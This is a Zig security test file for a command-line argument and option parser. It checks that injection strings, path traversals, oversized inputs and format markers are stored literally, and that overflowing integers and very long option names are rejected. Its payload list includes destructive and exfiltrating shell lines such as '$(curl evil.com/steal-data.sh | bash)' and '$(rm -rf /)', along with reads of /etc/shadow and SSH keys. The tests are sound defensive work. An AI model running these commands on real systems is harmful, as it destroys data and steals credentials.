const std = @import("std");
const testing = std.testing;
const zcli = @import("zcli.zig");
const args_parser = @import("args.zig");
const options_parser = @import("options.zig");
const levenshtein = @import("levenshtein.zig");
const resource_limits = @import("resource_limits.zig");

// ============================================================================
// Security Test Framework - Corrected Version
// ============================================================================

/// Collection of malicious input patterns for security testing
const MaliciousInputs = struct {
    const command_injections = [_][]const u8{
        "$(rm -rf /)",
        "`cat /etc/passwd`",
        "'; DROP TABLE commands; --",
        "${HOME}/../../../etc/passwd",
        "$(curl evil.com/steal-data.sh | bash)",
        "&& rm -rf /",
        "| cat /etc/shadow",
        "; ls -la /root",
    };

    const path_traversals = [_][]const u8{
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/dev/random",
        "/proc/self/environ",
        "\\\\network\\share\\sensitive",
        "../../../.ssh/id_rsa",
        "C:\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
    };

    const buffer_overflows = [_][]const u8{
        "A" ** 1000,
        "A" ** 10000,
        "\x00" ** 1000,
        "\xFF" ** 1000,
        "🔥" ** 500,
    };

    const integer_overflows = [_][]const u8{
        "18446744073709551615", // u64 max
        "999999999999999999999999999999999999",
        "-9223372036854775808", // i64 min
        "1e308", // Float overflow
    };

    const format_strings = [_][]const u8{
        "%s%s%s%s%s%s%s%s%s%s",
        "%x%x%x%x%x%x%x%x%x%x",
        "%n%n%n%n%n%n%n%n%n%n",
        "{}{}{}{}{}{}{}{}{}{}",
    };
};

/// Test structures
const TestArgs = struct {
    name: []const u8,
    count: u32 = 0, // Now properly handled as default value
    file: ?[]const u8 = null,
};

const TestOptions = struct {
    output: []const u8 = "stdout",
    files: []const []const u8 = &.{},
    count: u32 = 0,
    enabled: bool = false,
};

// ============================================================================
// Security Tests - Corrected Implementation
// ============================================================================

test "security: argument and option strings preserve shell metacharacters literally" {
    const allocator = testing.allocator;

    for (MaliciousInputs.command_injections) |malicious_input| {
        const args = [_][]const u8{malicious_input};
        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqualStrings(malicious_input, parsed.name);

        const option_args = [_][]const u8{ "--output", malicious_input };
        const parsed_opts = try options_parser.parseOptions(TestOptions, allocator, &option_args, null);
        defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
        try testing.expectEqualStrings(malicious_input, parsed_opts.options.output);
    }
}

test "security: argument and option strings preserve paths literally" {
    const allocator = testing.allocator;

    for (MaliciousInputs.path_traversals) |malicious_path| {
        const args = [_][]const u8{ "test", malicious_path };
        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqualStrings(malicious_path, parsed.file.?);

        const option_args = [_][]const u8{ "--files", malicious_path };
        const parsed_opts = try options_parser.parseOptions(TestOptions, allocator, &option_args, null);
        defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
        try testing.expectEqual(@as(usize, 1), parsed_opts.options.files.len);
        try testing.expectEqualStrings(malicious_path, parsed_opts.options.files[0]);
    }
}

test "security: long argument and option strings are preserved exactly" {
    const allocator = testing.allocator;

    for (MaliciousInputs.buffer_overflows) |long_input| {
        const args = [_][]const u8{long_input};
        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqualStrings(long_input, parsed.name);

        const option_args = [_][]const u8{ "--output", long_input };
        const parsed_opts = try options_parser.parseOptions(TestOptions, allocator, &option_args, null);
        defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
        try testing.expectEqualStrings(long_input, parsed_opts.options.output);
    }
}

test "security: overflowing integer arguments fall through without changing defaults" {
    for (MaliciousInputs.integer_overflows) |overflow_input| {
        // Test integer parsing with overflow values. `count` (u32 = 0) is a
        // non-trailing defaulted field, so an unparseable token falls through
        // to the later `file` positional instead of hard-erroring. The security
        // property is that the integer field is NEVER poisoned with an
        // out-of-range value: on fall-through it keeps its default (0).
        const args = [_][]const u8{ "test", overflow_input };

        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqual(@as(u32, 0), parsed.count);
        try testing.expectEqualStrings(overflow_input, parsed.file.?);
    }
}

test "security: overflowing integer options return OptionInvalidValue" {
    for (MaliciousInputs.integer_overflows) |overflow_input| {
        const option_args = [_][]const u8{ "--count", overflow_input };
        try testing.expectError(
            zcli.ZcliError.OptionInvalidValue,
            options_parser.parseOptions(TestOptions, testing.allocator, &option_args, null),
        );
    }
}

test "security: argument and option strings preserve format markers literally" {
    const allocator = testing.allocator;

    for (MaliciousInputs.format_strings) |format_string| {
        const args = [_][]const u8{format_string};
        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqualStrings(format_string, parsed.name);

        const option_args = [_][]const u8{ "--output", format_string };
        const parsed_opts = try options_parser.parseOptions(TestOptions, allocator, &option_args, null);
        defer options_parser.cleanupOptions(TestOptions, parsed_opts.options, allocator);
        try testing.expectEqualStrings(format_string, parsed_opts.options.output);
    }
}

// ============================================================================
// Resource Exhaustion Tests
// ============================================================================

test "security: option occurrences cost linear work, so they carry no policy cap (#741)" {
    const allocator = testing.allocator;

    // There is deliberately no `max_total_options`. Repeating a flag far past
    // the old 100-occurrence cap parses fine and accumulates every value: each
    // occurrence costs linear work and borrows its value from the input rather
    // than copying it, and `docker run --env` / `cc -I` shaped CLIs need this.
    // (The bound is linearity, not ARG_MAX — this test is itself a library
    // caller handing the parser a slice it built in memory, where no OS limit
    // applies.) See resource_limits.zig.
    var argv: std.ArrayList([]const u8) = .empty;
    defer argv.deinit(allocator);
    var names: std.ArrayList([]u8) = .empty;
    defer {
        for (names.items) |n| allocator.free(n);
        names.deinit(allocator);
    }
    for (0..1000) |i| {
        const name = try std.fmt.allocPrint(allocator, "file{d}.txt", .{i});
        try names.append(allocator, name);
        try argv.append(allocator, "--files");
        try argv.append(allocator, name);
    }

    const parsed = try options_parser.parseOptions(TestOptions, allocator, argv.items, null);
    defer options_parser.cleanupOptions(TestOptions, parsed.options, allocator);
    try testing.expectEqual(@as(usize, 1000), parsed.options.files.len);
}

// Names built at container scope so the `**` repeats are unambiguously comptime.
const name_at_cap = "--" ++ ("a" ** resource_limits.max_option_name_length);
const name_one_over_cap = "--" ++ ("a" ** (resource_limits.max_option_name_length + 1));
const name_far_over_cap = "--" ++ ("a" ** 300);

test "security: the option-name cap is a boundary, not a blanket rejection" {
    const allocator = testing.allocator;

    // Well past the cap: fails fast instead of being fed through lookup and
    // the O(name x fields) suggestion scoring that the cap exists to bound.
    {
        const args = [_][]const u8{name_far_over_cap};
        try testing.expectError(
            zcli.ZcliError.ResourceLimitExceeded,
            options_parser.parseOptions(TestOptions, allocator, &args, null),
        );
    }

    // One byte over: the first name that trips it.
    {
        const args = [_][]const u8{name_one_over_cap};
        try testing.expectError(
            zcli.ZcliError.ResourceLimitExceeded,
            options_parser.parseOptions(TestOptions, allocator, &args, null),
        );
    }

    // Exactly at the cap: NOT a resource-limit failure. No field is named this,
    // so it lands as an ordinary unknown option. This is what pins the cap as a
    // boundary rather than just "something got rejected".
    {
        const args = [_][]const u8{name_at_cap};
        try testing.expectError(
            zcli.ZcliError.OptionUnknown,
            options_parser.parseOptions(TestOptions, allocator, &args, null),
        );
    }

    // And ordinary option names still parse: the cap rejects only the offending
    // token, it does not make the parser hostile to normal input.
    {
        const args = [_][]const u8{ "--count", "7", "--enabled" };
        const parsed = try options_parser.parseOptions(TestOptions, allocator, &args, null);
        defer options_parser.cleanupOptions(TestOptions, parsed.options, allocator);
        try testing.expectEqual(@as(u32, 7), parsed.options.count);
        try testing.expect(parsed.options.enabled);
    }
}

test "security: resource exhaustion - processing bounded regardless of input" {
    const allocator = testing.allocator;

    // Score many candidates against a typo, mirroring the suggestion hot loop,
    // and assert it completes with a well-defined result. (This deliberately
    // does NOT assert on wall-clock time: an elapsed-time bound flakes on a
    // loaded CI runner. The resource-exhaustion guard below is what actually
    // matters, and it's deterministic.)
    const command_count = 50; // Reasonable test size
    const similar_commands = try generateSimilarStrings(allocator, command_count, "command");
    defer freeSimilarStrings(allocator, similar_commands);

    var closest: usize = std.math.maxInt(usize);
    for (similar_commands) |candidate| {
        const distance = levenshtein.editDistance("commnd", candidate);
        if (distance < closest) closest = distance;
    }
    try testing.expect(closest != std.math.maxInt(usize));

    // The real DoS guard: the edit-distance kernel is O(m*n), so attacker-
    // controlled input length must NOT translate into unbounded work. The
    // kernel caps each operand to max_practical_len (256) before filling the
    // matrix, so the matrix it fills is bounded by 256*256 no matter how long
    // the inputs are. Verify that cap deterministically: the distance computed
    // over a megabyte-long input must equal the distance over its first 256
    // bytes — i.e. everything past the cap is ignored, so there is no O(m*n)
    // blow-up on huge inputs. (No wall clock involved.)
    const cap = 256;
    const huge = try allocator.alloc(u8, 1024 * 1024);
    defer allocator.free(huge);
    @memset(huge, 'a');

    // A short query against a huge candidate (both operand orderings).
    try testing.expectEqual(
        levenshtein.editDistance("commnd", huge[0..cap]),
        levenshtein.editDistance("commnd", huge),
    );
    try testing.expectEqual(
        levenshtein.editDistance(huge[0..cap], "commnd"),
        levenshtein.editDistance(huge, "commnd"),
    );

    // Two huge strings: only the first 256 bytes of each can matter.
    const huge2 = try allocator.alloc(u8, 1024 * 1024);
    defer allocator.free(huge2);
    @memset(huge2, 'b');
    try testing.expectEqual(
        levenshtein.editDistance(huge[0..cap], huge2[0..cap]),
        levenshtein.editDistance(huge, huge2),
    );
}

test "security: sensitive-looking argument strings are preserved literally" {
    const sensitive_inputs = [_][]const u8{
        "/etc/passwd",
        "/home/user/.ssh/id_rsa",
        "C:\\Users\\Admin\\Documents\\secrets.txt",
        "/root/.env",
    };

    for (sensitive_inputs) |sensitive_input| {
        const args = [_][]const u8{ "test", sensitive_input };
        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqualStrings(sensitive_input, parsed.file.?);
    }
}

// ============================================================================
// Boundary Condition Tests
// ============================================================================

test "security: boundary conditions - empty inputs" {
    const allocator = testing.allocator;

    // Test empty argument list
    const empty_args: [0][]const u8 = .{};

    try testing.expectError(
        zcli.ZcliError.ArgumentMissingRequired,
        args_parser.parseArgs(TestArgs, &empty_args, null),
    );

    const parsed = try options_parser.parseOptions(TestOptions, allocator, &empty_args, null);
    defer options_parser.cleanupOptions(TestOptions, parsed.options, allocator);
    try testing.expectEqualStrings("stdout", parsed.options.output);
    try testing.expectEqual(@as(usize, 0), parsed.options.files.len);
    try testing.expectEqual(@as(u32, 0), parsed.options.count);
    try testing.expect(!parsed.options.enabled);
}

test "security: boundary conditions - null bytes" {
    // Test handling of null bytes (potential string termination attacks)
    const null_byte_inputs = [_][]const u8{
        "test\x00injected",
        "\x00leading_null",
        "trailing_null\x00",
    };

    for (null_byte_inputs) |null_input| {
        const args = [_][]const u8{null_input};

        const parsed = try args_parser.parseArgs(TestArgs, &args, null);
        try testing.expectEqual(null_input.len, parsed.name.len);
        try testing.expectEqualStrings(null_input, parsed.name);
    }
}

test "security: boundary conditions - extreme values" {
    // Test extreme boundary values
    // Our parser accepts any string value, including whitespace and empty strings
    // This is correct behavior - string validation is the application's responsibility
    const extreme_inputs = [_][]const u8{
        " ", // Single space
        "\t", // Single tab
        "\n", // Single newline
        "a", // Single character
        " a", // Space + character
        "test", // Normal string
        "", // Empty string
    };

    for (extreme_inputs) |input| {
        const args = [_][]const u8{input};

        // All string inputs should succeed
        const parsed = args_parser.parseArgs(TestArgs, &args, null) catch |err| {
            std.log.err("Input '{s}' failed unexpectedly: {}", .{ input, err });
            return err;
        };

        // Verify the string was preserved exactly as provided
        try testing.expectEqualStrings(input, parsed.name);
        try testing.expectEqual(input.len, parsed.name.len);
    }

    // Test what SHOULD fail: no arguments at all for required field
    const no_args: [0][]const u8 = .{};
    const result = args_parser.parseArgs(TestArgs, &no_args, null);
    try testing.expectError(zcli.ZcliError.ArgumentMissingRequired, result);
}

// ============================================================================
// Helper Functions
// ============================================================================

/// Generate a large number of similar strings for stress testing
fn generateSimilarStrings(allocator: std.mem.Allocator, count: usize, base: []const u8) ![][]const u8 {
    const strings = try allocator.alloc([]const u8, count);
    for (strings, 0..) |*string, i| {
        string.* = try std.fmt.allocPrint(allocator, "{s}{d}", .{ base, i });
    }
    return strings;
}

/// Clean up generated similar strings
fn freeSimilarStrings(allocator: std.mem.Allocator, strings: [][]const u8) void {
    for (strings) |string| {
        allocator.free(string);
    }
    allocator.free(strings);
}
